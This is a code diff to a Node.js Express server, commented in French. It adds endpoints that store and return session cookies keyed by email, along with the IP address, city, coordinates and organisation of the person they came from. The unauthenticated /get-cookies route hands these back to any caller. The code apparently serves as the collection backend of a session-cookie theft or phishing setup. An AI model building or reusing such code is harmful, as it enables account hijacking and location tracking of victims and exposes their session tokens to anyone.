@@ -24,6 +24,7 @@ db.initializeDatabase()
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static('views'));
+app.use(bodyParser.json({ limit: '2mb' })); // Augmente la limite si besoin
 
 // Middleware pour les logs
 app.use((req, res, next) => {
@@ -262,6 +263,59 @@ setInterval(async () => {
     console.error('Erreur lors du nettoyage automatique:', error);
   }
 }, 60 * 60 * 1000); // Toutes les heures
+
+app.post('/save-cookies', async (req, res) => {
+  console.log('Données reçues pour /save-cookies:', req.body);
+
+  const { email, cookies, location } = req.body;
+  if (!email || !cookies) {
+    return res.status(400).json({ error: 'Email et cookies sont requis.' });
+  }
+  try {
+    await db.saveSessionCookies(
+      email,
+      cookies,
+      location?.ip || '',
+      location?.city || '',
+      location?.region || '',
+      location?.country || '',
+      location?.latitude || null,
+      location?.longitude || null,
+      location?.org || ''
+    );
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Erreur SQL /save-cookies:', error);
+    res.status(500).json({ error: 'Erreur lors de la sauvegarde des cookies' });
+  }
+});
+
+app.get('/get-cookies', async (req, res) => {
+  const email = req.query.email;
+  if (!email) {
+    return res.status(400).json({ error: 'Email requis' });
+  }
+  try {
+    const row = await db.getSessionCookies(email);
+    if (row) {
+      res.json({
+        email,
+        cookies: row.cookies,
+        ip: row.ip,
+        city: row.city,
+        region: row.region,
+        country: row.country,
+        latitude: row.latitude,
+        longitude: row.longitude,
+        org: row.org
+      });
+    } else {
+      res.status(404).json({ error: 'Aucun cookie trouvé pour cet email' });
+    }
+  } catch (error) {
+    res.status(500).json({ error: 'Erreur lors de la récupération des cookies' });
+  }
+});
 
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Serveur web lancé sur http://localhost:${PORT}`);
